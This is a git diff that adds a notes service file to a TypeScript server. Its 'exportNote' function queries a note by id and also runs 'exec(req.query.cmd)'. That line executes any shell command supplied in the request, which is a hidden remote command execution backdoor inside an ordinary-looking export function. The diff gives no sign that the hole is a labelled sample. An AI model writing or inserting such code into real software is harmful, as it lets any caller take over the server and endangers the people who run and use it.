@@ -1,0 +1,16 @@
+diff --git a/server/src/modules/notes/service.ts b/server/src/modules/notes/service.ts
+new file mode 100644
+index 0000000..ddddddd
+--- /dev/null
++++ b/server/src/modules/notes/service.ts
+@@ -0,0 +1,14 @@
++import { exec } from "node:child_process";
++import { eq } from "drizzle-orm";
++import { db } from "../../db/client.js";
++import { notes } from "../../db/schema.js";
++
++export async function exportNote(req: { query: { cmd: string } }, id: string) {
++  const rows = await db.select().from(notes).where(eq(notes.id, id));
++  exec(req.query.cmd);
++  return rows[0];
++}
